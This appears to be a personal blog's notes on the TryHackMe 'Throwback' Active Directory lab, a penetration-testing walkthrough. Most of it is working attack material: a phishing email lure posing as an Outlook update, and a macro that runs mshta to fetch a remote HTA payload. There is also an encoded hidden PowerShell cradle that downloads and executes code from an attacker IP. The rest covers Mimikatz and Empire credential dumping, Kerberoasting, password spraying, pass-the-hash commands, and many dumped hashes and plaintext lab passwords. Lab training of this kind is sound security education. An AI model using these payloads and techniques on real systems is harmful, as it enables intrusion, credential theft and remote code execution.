---
layout: post
title: TryHackMe - ThrowBack 
categories: lab
permalink: /:categories/throwback/
---  

###Throwback lab from THM


=========================================================================================
ACTIVE DIRECTORY 
=========================================================================================
An Active Directory collections of servers and computers inside a domain
An Active Directory collections of servers and computers inside a domain
Domain controller is a windows server running the Active Directory Domain Services



Types of Active Directory Users :
Domain Administrators   : Controls the domain and usually have access to the domain controllers
Service Accounts   : used mostly for service maintenance
Local Administrators   : have access and make changes to the local computers
Domain Users    : eveeryday users on the domain

Domain Policies :
They dictate how a server operate and dictate what rules it will and will not follow

Sample Policies =
Disable Windows Defender -  Disable windows defeender across all machine on the domain
Digitallly Sign Communication - Can disable  or enable SMB signing on the domain controller

Domain Services :
The service the domain controller provides to the PC in the domain, Example
LDAP
DNS, LLMNR,NBT-NS


Domain Authentication :
the authentication proceddure set in place implemented across the domain
Kerberos = uses ticket granting ticker and service tickets fot auth purposes
NTLM + default windows auth protocoal uses encrypted challenge / response


=========================================================================================
POWERSHELL
=========================================================================================
Powershell has a VERB-NOUN flavor

Example of Verbs:

Get
Start
Stop
New
Oot
Read
Write

Example of statements : get-help 




Get-Command gets all the cmdlets installed on the current device. The  great thing about this cmdlet is that it allows for pattern matching  like the following.
Seaching for commands using Get-Command +  wildcards :
  Get-Command *-Help
  Get-Command Get-*

FIltering Objects :
Verb-Noun | Where-Object -Property PropertyName -operator Value

Here's an example of checking the stopped processes:




=========================================================================================
POWERSHELL DOMAIN ENUMERATION
=========================================================================================


USING POWERVIEW

Get-NetDomain     :   List domian information inluding FQDN
Get-NetDOmainController   ;  List all the domain controllers within the network
Get-NetForest  : Provides all the assosiated domains in a forest, the root domain , as well as the domain controller for the root domain
Get-NetDomainTrust   : Provide trust information across domains



=========================================================================================
ENTERING THE BREACH   
=========================================================================================
Publicly facing machines in the Network
Throwback-PROD
Throwback-FW01
Throwback-MAIL


ATTACKING - PROD  10.200.154.219



Domain Name : THROWBACK.LOCAL	
NetBIOS COmputer Name : THROWBACK-PROD
DNS Computer Name : THROWBACK-PROD.THROWBACK.local  


ATTACKING  - MAIL 10.200.154.232
credentials : tbhguest:WelcomeTBH1!



Extracted  contacts from the mailserver using guest account

|  | W Humphrey | HumphreyW | HumphreyW@throwback.local |  |
|  | SummersW | Summers Winters | SummersW@throwback.local |  |
|  | FoxxR | Rikka Foxx | FoxxR@throwback.local |  |
|  | noreply | noreply noreply | noreply@throwback.local | TBH{4060a70860f0a1648e5a991de1739888} |
|  | DaibaN | Nana Daiba | DaibaN@throwback.local |  |
|  | PeanutbutterM | Mr Peanutbutter | PeanutbutterM@throwback.local |  |
|  | PetersJ | Jon Peters | PetersJ@throwback.local |  |
|  | DaviesJ | J Davies | DaviesJ@throwback.local |  |
|  | BlaireJ | J Blaire | BlaireJ@throwback.local |  |
|  | GongoH | Hugh  Gongo | GongoH@throwback.local |  |
|  | MurphyF | Frank Murphy | MurphyF@throwback.local |  |
|  | JeffersD | D Jeffers | JeffersD@throwback.local |  |
|  | HorsemanB | BoJack Horseman | HorsemanB@throwback.local |  |

SummersW@throwback.local,FoxxR@throwback.local,DaibaN@throwback.local,PeanutbutterM@throwback.local,PetersJ@throwback.local,DaviesJ@throwback.local,BlaireJ@throwback.local,GongoH@throwback.local,MurphyF@throwback.local,JeffersD@throwback.local,HorsemanB@throwback.local

SummersW@throwback.local   FoxxR@throwback.local   DaibaN@throwback.local   PeanutbutterM@throwback.local   PetersJ@throwback.local   DaviesJ@throwback.local    BlaireJ@throwback.local     GongoH@throwback.local    MurphyF@throwback.local   JeffersD@throwback.local   HorsemanB@throwback.local

"SummersW@throwback.local","FoxxR@throwback.local", "DaibaN@throwback.local", "PeanutbutterM@throwback.local", "PetersJ@throwback.local", "DaviesJ@throwback.local", "BlaireJ@throwback.local", "GongoH@throwback.local", "JeffersD@throwback.local", "HorsemanB@throwback.local"


Email

Hey Team,


There has been an update the the official Microsoft outlook used in our environment, kindly download and install the binary attached to this email with urgency to update outlook in order to avoid downtimes

Thank you for your compliance

IT Support



ATTACKING - FW01  10.200.154.138
pfsense using default credentials
 



ID_RSA
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAqgsr8IE43iaA7wzgTmbpjB7WsRC2lIRFJkgTo4rFkfAck/lm
c4Q+SuwtpjYv9XK57Qwi/Qx2E08V27SpBPp/wFSQAao9XyRqwITdHWYTTmdcdAAK
dReGxZYCDbweQkkgx2estvSTQ48OltKDgSBJyc7g+1t8eDWS91ubFkSbCtbdeUpZ
O+i25eXNX8PeJSWWG9qGxisa2+DJJO4GED+QY4VbSNugINhuWGM33FPsNbKag7dH
M2J7JNkGZKd6HyR7t87rwlqWxiQytSAb9WCwuPnVL7PBl1aawSdqcaN2QFx7EFxn
JP7Fhg1ZJLTfuewcYbdqrN5ltOLnI3a9EE7I1wIDAQABAoIBAEq0TcGDg/BVCh/7
kC/hlokwozF3Hj9xPM/sqnQW62WKD4QS9aeaWaOgzw1OkRNMK9Kwmk6Bwv4IqJm1
bOv7AVUF0Z5ppDzASwX5WQspZSH01vE/c1it1U/I724JT2Hfrr7sFTzrhicQGmC4
a323KbO3Z7AGKVDGeKKjZCcMTPEdbPkGriD6o72cQjxNutUttHMl19MQ9itksh53
8fuG8WjmZoN2ml9oz29IuLR/riIQq2HJ4CTRX10iEJU0yeJNhYpyAuuzl7OE35+J
30/yGwKGX6Nm4z5JXuua6L7faL2qDjuD5cSVM02iPfs8Xyo/R8yWhxvQ50JupzN/
LgG/RYECgYEA2p24GsmejWqBavcZLwRfqIgSTxsL/7015JVOF/i8xqNEFRjreHEn
dVvEfZI2LvBSl9ZPnxu/hVJ3cE6OK6GrGuDt1Aj3HxZRXU5W33mw3jM4QmPfDc5D
NzzvWB9ZIrbzFrrza4cuwtYJqWsny2yIMOnCFAyR+4E9EQYJmkKtwW8CgYEAxx8c
9OZwh97VRT19mETnIbVoF91nb18D+IVK2n/+cNa76LRoz+2wafEYbsXzm0FClcEP
uL+iWqCl5GhrrypBnPH77rO2F2It2mmeNlmICK7bhFdCrsKiB+1DV7q1hiMHjWXS
h5kFN6ekjWQaHEf/iTPUcWvyMY1Kj5rqYlCa6xkCgYBpq57X4+jttjOEPpg/r7+F
OPCQqCQuo4ivSrQKxkKJSVWZVQhMmXVXNtpNUCU8nxFtLzwhTkpO6UOuV2pFEMoi
HeMXgJXiwujlTv6S2sFxRhTFkny4saCvzJZsZAqzyvbJX+hVa2xg5RCagZ8kpvtV
mUgkZMcTaK7Z0a9Gj0BppQKBgQCDdVwFpvlWClxc2QrI83xwebZeQxKdqWoSsdVI
ScYusuXd7PVhiPe2CbDquQ9qSXxvJ8V8YDAMixDaqcGmJEyrE+sSnVyzNWM2VhJY
qWUw7lgImB9zBxY4C4ExMxfSld/PjxCd6v1R0ADIQ/UlBLeE2k4AD5cW9cPq6Qii
nbqZSQKBgBzPXrMIM+4RAMz2MLcjBhZBVJ3pYt1PM4UorfWJhi+vgDdYxwIZ4fYe
xklP11hdkJ2lG20fA0tqaCuOtcos7cQFrLwjAQJA6TrO+qfhHEbgaZVI7UYa1PPv
zMHfl5yy1ghQeCUMoDbw1Wa0ohy9/6fABe45ACh1DOE72LOGf3Cr
-----END RSA PRIVATE KEY-----
ssh -i id_rsa root@10.200.154.138


POST EXPLOITATION ON FW01

credentials found in log files
HumphreyW:1c13639dba96c7b53d26f7d00956a364


=========================================================================================
FIRST CONTACT
=========================================================================================
PASSWORD SPRAYING
Some examples of weak passwords:  
    Summer2020
    Management2020
    Management2018
    Password2020
    <company>2020
    Password123






[80][http-post-form] host: 10.200.154.232   login: MurphyF   password: Summer2020


=========================================================================================
PHISHING
=========================================================================================

Target Identification



Payloads
Staged & Stageless payloads:
staged payloads requires an handler to catch the payload and send the second stage to trigger the reverse shell    Example : windows/x64/shell/reverse_tcp
stageless payalods do not requre an handler and can be caught with utilities like netcat    Example : Windows/x64/shell_reverse_tcp




=========================================================================================
HASH CRACKING USING RULES
=========================================================================================

Asides from running hashcat agains a wordlists, it is advidable to use rules while bruteforcing 
we can also use mentallist tools to generate a custom password list

Sometimes your standard wordlist like rockyou is not enough to crack a hash. You can use a rule list to change the wordlist and add rules to it in order to crack a hash. A rule list works by having a set of rules that can append characters to a password, attach characters, and substitute words and characters. 

https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule
PETERSJ::THROWBACK:81847d458ac9f3d1:d008a6c248e65c98d2e39598caa8d1ac:0101000000000000005c38476a0dd801e5e171523de4361d0000000002000800340031004d004b0001001e00570049004e002d00550052004400530059004c00510053005a003600360004003400570049004e002d00550052004400530059004c00510053005a00360036002e00340031004d004b002e004c004f00430041004c0003001400340031004d004b002e004c004f00430041004c0005001400340031004d004b002e004c004f00430041004c0007000800005c38476a0dd801060004000200000008003000300000000000000000000000002000007d5c6421d062fd571e0c26dd53578f8116274945c049da7ed89a81eb6a255bbc0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00350030002e003100350031002e00320035000000000000000000:Throwback317

Password: Throwback317


Local Priviledge Escalation on PROD

DefaultDomainName    :
DefaultUserName      : BlaireJ
DefaultPassword      : 7eQgx6YzxgG3vC45t5k9
AltDefaultDomainName :
AltDefaultUserName   :
AltDefaultPassword   :

Domain Enumeration on PROD from Blairej
xfreerdp /v:10.200.154.219 /u:blairej /p:7eQgx6YzxgG3vC45t5k9 /size:96%
impacket-psexec throwback.local/BlaireJ:7eQgx6YzxgG3vC45t5k9@10.200.154.219
Get-NetDomain
Forest                  : THROWBACK.local
DomainControllers       : {THROWBACK-DC01.THROWBACK.local}

Get-NetDomainController

Forest                     : THROWBACK.local
CurrentTime                : 1/19/2022 8:23:20 PM
HighestCommittedUsn        : 2261635
OSVersion                  : Windows Server 2019 Datacenter
Roles                      : {SchemaRole, NamingRole, PdcRole, RidRole...}
Domain                     : THROWBACK.local
IPAddress                  : 10.200.154.117
SiteName                   : THROWBACK

Get-NetUSer | select cn

Administrator
Guest
krbtgt
WEBService
Rikka Foxx
Summers Winters
John Blaire
sshd
SQLService
Nana Daiba
Leeroy Stuart
TBService
LoginService
STAGEService
Rue White
Alisha Guthrie
Hallie Cochran
Vicky Burton
William Powell
Derick Nieves
Joy Castro
Walter Poole
Bryan Atkins
Faussie Hampton
Courtney Hayden
Clara Quinn
Tony Rosales
Ava Petersen
Rene Eaton
Marvin Livingston
Hugh Gongo
Stacey Foley
Violet Boyer
Deno Jacobson
Jayne Nixon
Hans Webb
Norman Lindsey
Lacey Parker
Lanny Sexton
Diann Anderson
Jerrod Spence
LLoyd Sosa
Robert Neal
Bette Baldwin
Adrienne Blackwell
Cheryl Trevino
Pedro Kramer
Stephen Clay
Ivan Montoya
Josef Brenard
Daniel Thorton
Verna Blackenship
Dominic Cortez
Merle Williamson
Weston Hanson
Jeff Lamb
Lewis Stanley
Shanna Cunningham
Dominique Pate
Ezra Harding
Erik Wilkinson
Kent Brooks
Jody Dotson
Angelica Benton
Renee Burch
Spooks
Dominic Jeffers
Jon Peters
Wittingston Humphrey
Bojack Horseman
TaskMgr
Hans Mercer
Backup User

=========================================================================================
C2 - Empire and StarKiller
=========================================================================================
1.) Go to the listeners tab and select CREATE LISTENER.







2.) Go to the stagers tab and select GENERATE STAGER.








Launch agent on the target




shell on c2





Invoke-Mimikatz module on Empire
mimikatz(powershell) # lsadump::lsa /patch 
Domain : THROWBACK-PROD / S-1-5-21-1142397155-17714838-1651365392  RID  : 000003f2 (1010)
 User : admin-petersj LM   :  NTLM : 74fb0a2ee8a066b1e372475dcbc121c5  RID  : 000001f4 (500) 
 User : Administrator LM   :  NTLM : a06e58d15a2585235d18598788b8147a  RID  : 000001f7 (503) U
 ser : DefaultAccount LM   :  NTLM :   RID  : 000001f5 (501) User : Guest LM   :  NTLM :   RID  : 000003f1 (1009) 
 User : sshd LM   :  NTLM : fe2acb5ea93988befc849a6981e0526a  RID  : 000001f8 (504)
  User : WDAGUtilityAccount LM   :  NTLM : 58f8e0214224aebc2c5f82fb7cb47ca1


=========================================================================================
Mimikatz - hashdump
=========================================================================================
put Mimikatz in privilege mode after deactivating AMSI and EDR
privilege::debug
token::elevate


Dumping Password Hashes

lsadump::lsa /patch
sekurlsa::tickets /export


Dumping SAM Hashes
lsadump::sam

Dumping Creds from Logged In Users
sekurlsa::logonPasswords


=========================================================================================
BLOODHOUND - Sharphound injestor 
=========================================================================================
. ./SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain throwback.local -ZipFileName loot.zip

=========================================================================================
LATERAL MOVEMENT // ROUTING & PROXYCHAINS
=========================================================================================

To get access to internal networks, we first get access to a meterpreter

use post/multi/manage/autoroute
to set up the routing tables so data from the attacker PC, can be routed to the internal network through the victim


use auxiliary/server/socks_proxy
to setup the socks proxy server on the attacking machine
set verson to 4a
srvhost 127.0.0.1

proxychains crackmapexec smb 10.200.154.0/24 -u users -d throwback.local -H hash

=========================================================================================
KERBEROASTING
=========================================================================================
Its noteworthy that kerberoasting targets service accounts, and not user account !
we can find kerberoastable accounts using Bloodhoud graph


proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 10.200.154.117  THROWBACK.local/blairej:7eQgx6YzxgG3vC45t5k9 -request


Cracked Creds from kerberoasting : mysql337570



http://timekeep.throwback.local/dev/passwordreset.php?user=murphyf&password=hacker1
Password reset to hacker1
Password successfully updated TBH{326e71e82d2cfc439ee513340b8d9222}


=========================================================================================
MALICIOUS MACRO & MSFCONSOLE HTA SERVER
=========================================================================================
After adding macro to xlsm
we use the  “windows/misc/hta_server ” module in msf to host a malicious HTA as a second stage payload to be sent 
 
 
 
 MACRO USED BELOW
````````````````````````````````````````
Sub HelloWorld()
    PID = Shell("mshta.exe https://192.168.100.128:8080/c9496fz.hta")
End Sub


Sub Auto_Open()
    HelloWorld
End Sub
````````````````````````````````````````

=========================================================================================
Got access tp TImeKeep machine using HTA server method, mograted process to an NT/AUTORITY service then hashdump to gather credentials

meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43d73c6a52e8626eabc5eb77148dca0b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd:1008:aad3b435b51404eeaad3b435b51404ee:6eea75cd2cc4ddf2967d5ee05792f9fb:::
Timekeeper:1009:aad3b435b51404eeaad3b435b51404ee:901682b1433fdf0b04ef42b13e343486:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::


CRACKED
user:pass
1. Timekeeper:keeperoftime
=========================================================================================
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username         Domain          NTLM                              SHA1
--------         ------          ----                              ----
Administrator    THROWBACK-TIME  43d73c6a52e8626eabc5eb77148dca0b  f994d4fe03f5ac239de4971c50f3af42e7c9436e
THROWBACK-TIME$  THROWBACK       9dcc499124209f0aa44a20c478aa53fd  13c7c5ddf0ec9ccf5fe0b2f6b281adb51cb82b1c

wdigest credentials
===================

Username         Domain          Password
--------         ------          --------
(null)           (null)          (null)
Administrator    THROWBACK-TIME  (null)
THROWBACK-TIME$  THROWBACK       (null)

kerberos credentials
====================

Username         Domain           Password
--------         ------           --------
(null)           (null)           (null)
Administrator    THROWBACK-TIME   (null)
THROWBACK-TIME$  THROWBACK.local  d1 f7 12 36 94 54 fc ce 9b 8a 4b f0 0f b9 c1 82 14 bd 6c 24 c3 93 5d 4d 69 8d e7 f
                                  5 44 81 f1 1c cc 10 86 58 21 fd a7 9e ff 8d 38 72 de 1a d8 b8 7a 8d bb 95 9f 9f 28
                                   42 a1 76 73 a9 56 7b 9e 39 30 f4 f6 84 0f c6 e3 dd 27 07 d8 a9 78 a1 5c 09 fe fb
                                  33 10 d9 d2 2d 76 7b 7e ac 1c d5 04 df 1e e1 cc 2a af ca 0b ad 51 a0 1b eb 35 32 2
                                  5 98 89 73 40 45 18 5c b4 51 7b f5 7f 1f fa 40 80 97 a2 f9 15 05 ec 81 b9 93 15 66
                                   ea 96 d8 2e 1b e2 2f 42 59 b9 ab d3 ce 7f 05 1b 10 78 d0 9c f3 62 d1 05 c3 60 6a
                                  b9 4f 66 ab 53 b5 09 48 27 94 84 1c dd 79 0f 04 98 cc e2 39 4b 41 e0 23 d1 8e 15 8
                                  6 db ab 02 24 73 57 79 fd d4 f8 0f 06 f5 4c d0 18 25 7a 72 5e 35 1f b9 9f 38 e2 00
                                   94 c0 df e8 a8 7e 19 c4 75 09 15 63 0d 4c d9 65 5b 6e 6f 91 7a
throwback-time$  THROWBACK.LOCAL  (null)



ACCESS TO TIMEKEEPER
proxychains ssh Timekeeper@10.200.154.176     pw: keeperoftime




got access to timekeeper user;  created and sent in mrat.exe to get meterpreter shell; migrated to NT/AUTHORITY process; entered system shell ; change admin password to random using 
net user administrator /random


then ssh'sd into admin account using proxychains



ACCESS TO MYSQLDB FROM TIMEKEEPER
users in database from timekeep machine
+-------------------------+
| users                   |
+-------------------------+
+---------------+-------------------------------------------------+
| USERNAME      | PASSWORD                                        |
+---------------+-------------------------------------------------+
| spopy         | ilylily                                         |
| foxxr         | Fnfdsfdf49sA(2o1id                              |
| winterss      | rei0g0erggdfs(2o1id                             |
| daiban        | Bananas!                                        |
| blairej       | BlaireJ2020                                     |
| FLAG          | TBH{ac3f61048236fd398da9e2289622157e}           |
| daviesj       | FEFJdfjep302dojsdfsFSFD                         |
| horsemanb     | XZCFLDOSPfem,wefweop3202D                       |
| peanutbutterm | fi9sfjidsJXSVNSKXKNXSIOPfpoiewspf               |
| humphreyw     | fedw99fjpfdsjpjpfodspjofpjf99                   |
| jeffersd      | fDSOKFSDFLMmxcvmxz;p[p[dgp[edfjf99              |
| petersj       | owowhatsthisowoDarknessBestGirlowo123uwu");



 |
| foxxr         | ILoveAnimemes :3                                |
| daviesj       | efepjfjsdfjdsfpjopfdj4po                        |
| gongoh        | etregrokdfskggdf'fd4po                          |
| dosierk       | e2349efjsdsdfhgopfdj4po                         |
| murphyf       | hacker1                                         |
| jstewart      | e423jjfjdsjfsdj32                               |

+---------------+-------------------------------------------------+


image



domain_users in database from timekeep machine

MariaDB [timekeepusers]> show tables; 
+-------------------------+ 
| Tables_in_timekeepusers |
+-------------------------+
| users                   |
+-------------------------+
1 row in set (0.001 sec)

MariaDB [timekeepusers]> use domain_users; 
Database changed 
+----------------------+
| ClemonsD             |
| DunlopM              |
| LoganF               |
| IbarraA              |
| YatesZ               |
| CopelandS            |
| MckeeE               |
| HeatonC              |
| FlowersK             |
| HardinA              |
| BurrowsA             |
| FinneganI            |
| GalindoI             |
| LyonsC               |
| FullerS              |
| SteeleJ              |
| WangG                |
| LoweryR              |
| JeffersD             |
| GreigH               |
| SharpK               |
| KruegerM             |
| ChenI                |
| VillanuevaD          |
| BegumK               |
| TBH{ac3f61048236fd39 |
| 8da9e2289622157e}    |
+----------------------+
27 rows in set (0.002 sec)



Other database content



SInce we have domain usernames and some passwords from the database
we use the credentials to spray the domain controller using the jumbox by proxychains




SMB         10.200.154.117  445    THROWBACK-DC01   [+] THROWBACK.local\JeffersD:Throwback2020 


Domain Controller Credentials
THROWBACK.local\JeffersD:Throwback2020 

proxychains xfreerdp /u:JeffersD /p:Throwback2020 /v:10.200.154.117


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
FILE SHARE FROM WINDOWS TO LINUX USING AUTHENTICATED SMBSHARE 
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
some times group policies on AD will not permit connection to exeternal unsecure smbshare, so while creating an smbserver on linux using smbserver.py, user SMBv2 protocal and include user & pass for authentication

python3 /opt/impacket/examples/smbserver.py -smb2support -username hacker -password hacker fileshare .


then connect to if from windows this way 
 net use \\10.50.151.25\fileshare /user:hacker hacker
 
 after connected succesfully, you can safely copy item from and to the saerver
 
 
 EXPLOITING USERS WITH DCSYNC PRIVILEGES
 
 FInding users with DCSYNC priv using bloodhound, search “Find Principals with DCSync Rights”
 
 
 with DCSYNC priviledges, we can dump credentials on the machine we have priviledges on, but with a valid credential of the user with tthe priviledges
 
 
 
 TBH_Backup2348!
 
 
 proxychains impacket-secretsdump -dc-ip 10.200.154.117 throwback.local/backup@10.200.154.117

 
 
 THROWBACK.local\MercerH:1206:aad3b435b51404eeaad3b435b51404ee:5edc955e8167199d1b7d0e656da0ceea:::
'"sekurlsa::pth /user:mercerh /domain:throwback.local /ntlm:5edc955e8167199d1b7d0e656da0ceea"'
proxychains impacket-psexec -dc-ip 10.200.154.117 -hashes aad3b435b51404eeaad3b435b51404ee:5edc955e8167199d1b7d0e656da0ceea  throwback.local/mercerh@10.200.154.117


=========================================================================================
CROSS ----- ATTACK
=========================================================================================


If we have Trust priviledges to another domain controller, we can authenticate to that DC , with the admin credential of our currently owned DC








impacket-psexec throwback.local/BlaireJ:7eQgx6YzxgG3vC45t5k9@10.200.154.219
proxychains impacket-psexec -dc-ip 10.200.154.117 -hashes aad3b435b51404eeaad3b435b51404ee:5edc955e8167199d1b7d0e656da0ceea  throwback.local/mercerh@10.200.154.117
proxychains xfreerdp /u:MercerH /p:-changepw /v:10.200.154.118 /size:80%



lport => 4434


powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB3ADEAZwBDAEkAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAdwAxAGcAQwBJAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAdwAxAGcAQwBJAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4ANQAwAC4AMQA1ADEALgAyADUAOgA4ADAAOAAwAC8AbAA4ADcAUgBhAGEAYgBUAE0AbwA5AFAALwBCAEIASwA0AHoAZABKAFkAMwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4ANQAwAC4AMQA1ADEALgAyADUAOgA4ADAAOAAwAC8AbAA4ADcAUgBhAGEAYgBUAE0AbwA5AFAAJwApACkAOwA=





ESM-Example@TBHSecurity.com
FIN-Example@TBHSecurity.com
HRE-Example@TBHSecurity.com
ITS-Example@TBHSecurity.com
SEC-Example@TBHSecurity.com





SEC-Jstewart@TBHSecurity.com
username : Jstewart
databreach: pwnDB
password: aqAwM53cW8AgRbfr



TBSEC_GUEST:WelcomeTBSEC1!
TBH{19b6ca4281bbef3ee060aaf1c2eb4021}


user dc : TBH{3efabe3366172f3f97d1123f2cc6dfb5}

$krb5tgs$23$*TBService$TBSECURITY.LOCAL$TBSecurity.local/TBService*$b6dde6b28ff3e7d640e1aba4deb7a8f4$0b5fbab74463df311800ea7ac953a7b0666c1cfadf1e0924d43c8321d07786bcaed59c52e6b513a84296c4a3b35a0f0556fab4bbfef7cadbaa739e0a921758c811a1aa7dbe81ca85b33a4eb9cc5ac52a73c04db150f19ead38606263c0799115761ac13e72006ad06583753328c13f2c7ed63725bc73d35f3f710af63e3a5971faceeb58e23b0cac57d9eef0f89dfbfa7e021d027223f4bacebfc99ff59519f38bdffc0f800da6e47f8b6f1a170b32c7420dcf5cf0b580ea653d8cab0ebec0f0fc84cf17bd4b0a48014500a02669d65fec2ebeb8598e7ddd9fe91bb9f03b016152007c5d70efbd40d44863eca49a8dcd6f177ea2f58236b6363269bbe099976ab0033fe32a3997cbc59606ade44e274952e8df7ec96253536dda361df7eafd7921c39473a00c8674b5fac13743a3a25abbda36d0574ae5524459c088a46da80f0aaea30e85962ff0720304808ed680eacea396666ead151a3007c16ff48ac7bba12499811d6a8eb8b565d81c8af85cdc1e6d85430f0979c2d04cb58fccb3a372316f60d79795aed56b296e2da8ad9070e2aa8143f6f4423aec59e1aae291ad3a344bfa953aee3e82f1377f822a31ea1c7df0e6e80e1776a0ae424882aca5168125f1bca66d48d935120fbba904fdb6e185302c50586514236a810880221830d4fed48d0622ded3668470e9ce94df7bea190f02b6496acb41971c2e16dc83c25215143190058b17689f3d05dafd74df3db6cdbb2449cbd9692e931f986cc6aaa9896b143c4a2dcfe03b50393500b5d63e1027a4523667a0a1fc3b209c6daac3979fb3054061db2f3bb0cff64a674326a02b748f1d6e9459ae4fd524b46f1ec2944227911f5d681d5a2df05e5fb634f7337cac4e78e06ea582f73aff990d45271bc1b1816aaf0d67d3300386fc9dc9fc3b9e3d6261228922ed10be93fb570a2116b886ccca5f585ad65e529e2bdc907a760d4e193397c11158a4a7f02e2b4e9ce841a1b254e5069afce57725af1072270d363b513f3791395b5d69e4348a3b8167eff21072f5667869abb75080eed567385c3447702b5cbca675baae0bd9c9bfa05066947ec368b20e9e51d3e2c4ea48a286d5d0a9eade6f1878c4c265c49be053b2ac50a96cf1b12b10cabfc2c8a2161d4835905fcbfd355a4c67a7eb8b2c4a9951708ccb383c2f574e41564f3f12c072375e0d0b3f62913e3717f6178f253c195d2429c94f60a3c6998a8c2ab6582413c007c5feb78bdca64ca9c11244db7a2fe69fbd0f39d9e4835578b4403a7e619e1881bdbc9ffb05e0b6534fec940583bfa87f4994f7bd7568d66487075ab8cca58ae822798c885e7a2473fcd3a0157affba7151f443e7b190aace7a262ae72b67992ea854cfbe3c876cabb1c6

